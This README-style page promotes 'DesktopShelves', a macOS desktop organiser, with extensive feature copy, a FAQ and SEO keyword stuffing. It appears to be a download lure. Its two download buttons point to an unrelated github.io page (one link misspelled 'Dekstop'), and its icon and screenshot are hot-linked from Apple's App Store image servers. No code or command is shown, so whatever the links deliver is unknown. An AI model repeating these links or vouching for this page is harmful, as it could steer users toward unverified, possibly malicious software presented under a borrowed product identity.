# 🗂️ DesktopShelves for macOS — Tidy, Visual Shelves for a Zero-Stress Desktop

![DesktopShelves Icon](https://is1-ssl.mzstatic.com/image/thumb/Purple113/v4/de/67/4f/de674fab-0c90-283d-181b-630a4cf343b1/Icon.png/1200x630bb.png)

<!-- Download Button #1 — shield style -->
<div align="center" style="margin:14px 0 18px;">
  <a href="https://rumpels-kaji.github.io/.github/Dekstop">
    <img src="https://img.shields.io/badge/⬇️_GET_DESKTOPSHELVES-forestgreen?style=for-the-badge&logo=apple&logoColor=white" alt="Get DesktopShelves for macOS">
  </a>
</div>

---

## ✨ Elevator Pitch

If your Mac desktop is a blizzard of screenshots, drafts, ZIPs, and “final_v7_really_final” files, **DesktopShelves** turns chaos into **neat, named shelves** that sit directly on the desktop. Each shelf groups related files, shows live thumbnails, supports quick actions, and remembers where everything belongs—so your workspace looks intentional, not overwhelming.

---

## ❓ What is DesktopShelves? (Very detailed)

**DesktopShelves** is a **visual organizer** that overlays your macOS desktop with **smart shelves**—lightweight containers that hold files by project, topic, or time window. Instead of pushing you into a new app, DesktopShelves **augments the space you already use**. Drop a file on a shelf and it’s immediately categorized; drag between shelves to re-file; sort with a click; rename inline. Think of it as **Finder’s missing layer**: fast, tactile, and always visible.

At a technical level, every shelf is a **real macOS folder** rendered as a compact, scrollable strip with **live previews** (images, PDFs, audio scrubbing where supported), **badges** (file type, sync status), and **context actions** (open, reveal in Finder, share, tag, rename). You can anchor shelves to screen edges, stack them, auto-hide them behind other windows, or pin favorites above everything for a heads-up “command bar.” Shelves remember **layout density** (big thumbnails for design assets, compact list for logs), **sort order** (date added for inboxes, kind for research), and **color themes** per project so you can scan visually without reading.

DesktopShelves isn’t just a pretty face on folders; it **reduces friction at capture time**. New screenshots can auto-land in a **“Today”** shelf; downloads tagged with “invoice” can jump to **Finance**; files matching patterns (e.g., `*.sketch`, `brief*.pdf`) can be routed into the right shelf the moment they appear. You can define **rules** (by name, tag, extension, size, date) per shelf, creating a light automation system that keeps your desktop tidy even on busy days.

Because context switching kills focus, DesktopShelves favors **inline actions**. Quick-look a PDF, rename a file, tag it, or move it—without opening Finder. Need to clear the decks for a meeting? **Snooze** noisy shelves to a side panel, or collapse them to minimal headers you can expand later. When a project wraps, archive the shelf to a ZIP or move the backed-up folder to an external drive while keeping a **ghost shelf** as a breadcrumb.

File safety matters. Shelves operate on **real files in real folders**, so there’s no lock-in, database risk, or proprietary container. You can open the same folders in Finder, sync them via iCloud/Dropbox/Git, or share them with teammates. DesktopShelves simply gives you a **faster, more human-friendly view** of the same content, with optional rules to keep it flowing.

In short, DesktopShelves reframes the desktop from a dumping ground into a **living, glanceable dashboard** for your active work: capture, triage, progress, and archive—without changing how macOS stores files.

---

## ℹ️ About DesktopShelves (Deep dive, extended)

**Design philosophy.** Traditional launchers hide your files; full DAM tools over-structure them. DesktopShelves finds the middle: **light structure + instant access**. A shelf is quick to create, easy to name, and trivial to delete. You’re rewarded for small decisions (“this belongs to Design/Client A”) rather than punished by heavy metadata forms.

**Layout & presence.** Shelves are **first-class citizens** of the desktop. They can float over wallpaper, tuck under windows, or “peek” with a slim header that expands on hover. Snap to grids, align to gutters, and reserve “lanes” for work vs. reference. The **density slider** lets you switch from moodboard-style thumbnails to precise, developer-friendly lists with monospaced names.

**Capture flows.** Create dedicated **Inbox** shelves—e.g., *Today, This Week, Downloads-Triage*. Screenshots can auto-name with timestamps and drop into *Today*. Drag from Mail, Safari, or design tools directly onto a shelf; rules can add tags or rename on arrival. You can also **paste** items (images from clipboard) straight into a shelf as files.

**Rules & automation.** Light rules deliver outsized calm: “If name contains invoice → Finance,” “If extension is .sketch/.fig → Design,” “If older than 14 days → move to Archive.” Rules run **silently** or with a **tray notification**; each shelf can preview what would have matched to avoid surprises. For safety, any rule can be **undoable** with a built-in change log.

**Focus & flow.** Use **Scene Modes**: *Deep Work* hides chatter shelves and enlarges your active project; *Present* collapses everything to headers; *Review* sorts by date so you can sweep the week. Scenes can be **hotkeyed** so your desktop adapts to the moment.

**Collaboration & portability.** Because shelves map to folders, sharing is natural: right-click → *Reveal in Finder* → attach or share a link if it’s on a synced drive. The **shelf manifest** (a tiny JSON) stores layout and rules so teammates can clone the same view without copying files.

**Respect for macOS.** DesktopShelves leans on **Quick Look**, **Tags**, **ColorSync**, and **Accessibility**. It inherits system-level previews, honors Finder tags, supports dark mode, and exposes VoiceOver labels for every control. No custom file format, no fragile database—**future-proof by design**.

---

## 🧰 Capabilities at a Glance

| Area | What you get |
|---|---|
| Visual Shelves | Named, color-coded containers with live thumbnails or dense lists. |
| Smart Rules | Auto-file by name/tag/type/date/size; route screenshots; archive aging files. |
| Inline Actions | Rename, tag, Quick Look, share, reveal in Finder, duplicate, compress. |
| Layout Control | Snap, stack, pin on top, auto-hide, density slider, per-shelf themes. |
| Scenes & Focus | One-tap “Deep Work”, “Present”, and “Review” arrangements. |
| Safety & Undo | Optional confirmations, per-shelf activity log, easy rollback. |
| Open Storage | Real folders; iCloud/Dropbox/Git-friendly; no lock-in. |
| Performance | Apple Silicon-tuned; zero-lag scrolling; efficient preview caching. |

---

## 🧪 Everyday Workflows

- **Design sprint:** Shelves for *Brief*, *References*, *WIP*, *Exports*. Auto-route screenshots to *WIP*. Collapse everything to *Present* before screenshares.  
- **Writing:** Shelves for *Ideas*, *Sources*, *Drafts*, *Published*. Rules convert pasted clippings to Markdown files and tag sources.  
- **Sales/PM:** *Decks*, *Contracts*, *Logos*, *Reports*. One-click ZIP to send a clean package.  
- **Research:** *Papers*, *Datasets*, *Notes*, *Figures*. Dense list view with monospaced names and date sort.  
- **Personal:** *Receipts*, *Renovation*, *Travel*, *Kids School*. Archive shelf auto-moves items older than 30 days.

---

## 🖼 Screens & Previews

![Shelves on Desktop](https://is1-ssl.mzstatic.com/image/thumb/Purple/v4/65/0a/39/650a3919-10eb-b61c-eaee-92b6d170bf08/mzl.eyuvspbw.png/643x0w.jpg)

---

## ⚙️ Setup in 60 Seconds

1. Create **two shelves**: *Today* and *Project A*.  
2. Drag a messy cluster of files into *Project A*—watch the desktop clear.  
3. Turn on the **Screenshots → Today** rule.  
4. Hit the **density slider** to pick thumbnails vs. compact list.  
5. Save a **Scene** called *Deep Work* that hides everything except *Project A*.

---

## 💡 Power Tips

- Use color themes to **encode status** (green = active, gray = archive).  
- Start each week by **duplicating “This Week”** from a template shelf.  
- Keep your shelves inside an iCloud or Dropbox workspace for **effortless sync**.  
- Add a “📝 INBOX” shelf and commit to zeroing it at day’s end.  
- For handoffs, **Reveal in Finder → Compress** from the shelf context menu.

---

## 🖥 Requirements

- macOS 10.13 High Sierra or later  
- Apple Silicon or Intel 64-bit  
- ~150 MB free space (plus your files)  
- Works offline; integrates with Finder features if present (Tags/Quick Look)

---

## ❓ FAQ

**Are my files trapped in the app?**  
No—shelves map to normal folders you can open, sync, or share anywhere.

**Can I break anything with rules?**  
Rules are conservative by default and **undoable**. Preview matches before enabling.

**Does it slow down the desktop?**  
Shelves use lightweight previews and caching; Apple Silicon runs them smoothly.

**Can I hide shelves temporarily?**  
Yes—auto-hide, pin, or switch to a minimal header mode; use Scenes for one-tap layout shifts.

---

## 🏷 Tags (SEO)

desktopshelves • desktop shelves mac • organize mac desktop • tidy files mac • smart desktop folders • auto file rules mac • desktop productivity • live thumbnail shelves • finder overlay organizer • screenshot auto filing mac • desktop scenes mac • project shelves mac • zero inbox desktop • apple silicon organizer • quick look tags mac • archive shelf zip mac • focus mode desktop • visual file containers mac

---

<!-- Download Button #2 — pill/gradient style -->
<div align="center" style="margin:18px 0 22px;">
  <a href="https://rumpels-kaji.github.io/.github/Desktop" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#16a34a,#22c55e);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(34,197,94,.28);">
    ✅ Download DesktopShelves for macOS
  </a>
</div>
